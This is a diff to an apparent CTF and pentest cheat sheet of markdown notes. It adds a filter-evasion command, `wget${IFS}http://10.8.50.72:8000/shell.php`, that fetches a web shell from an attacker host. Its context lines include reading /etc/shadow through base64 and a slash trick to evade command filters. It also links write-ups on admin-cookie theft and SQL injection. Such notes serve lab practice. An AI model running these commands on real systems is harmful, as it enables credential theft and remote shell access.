@@ -20,7 +20,10 @@ xxd -r file.txt
 base64 /etc/shadow | base64 -d
 ltrace # is a debugging utility in Linux, used to display the calls a userspace application makes to shared libraries.
 ```
+```
 `l\s`: Equivalent to `ls`
+`wget${IFS}http://10.8.50.72:8000/shell.php`
+```
 
 #### if command to long
 ```python
@@ -80,7 +83,9 @@ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 grep -Rwi "text"
 ```
+---
 
 #### [steal admin cookie/sqli](/other/src/marketplace.md) (tryhackme:marketplace)
 #### [ohmyweb](/other/src/omyweb.md)
 
+---
